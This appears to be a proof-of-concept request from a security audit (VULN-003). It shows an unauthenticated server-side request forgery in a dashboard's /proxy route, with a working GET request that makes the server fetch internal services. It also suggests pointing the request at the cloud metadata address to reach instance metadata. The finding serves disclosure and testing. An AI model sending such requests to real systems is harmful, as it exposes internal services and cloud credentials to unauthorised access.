### VULN-003 — Unauthenticated SSRF via dashboard /proxy//<host>
### No Cookie / Authorization header — the /proxy/* forwarding branch precedes auth.

GET http://localhost:21526/proxy//api:3081/ HTTP/1.1
Host: localhost:21526

### Effect: the dashboard's Node server fetches http://api:3081/ (internal compose
### hostname) and returns its body. Swap the host to reach other internal services
### or, on a cloud VM, GET http://localhost:21526/proxy//169.254.169.254/latest/meta-data/
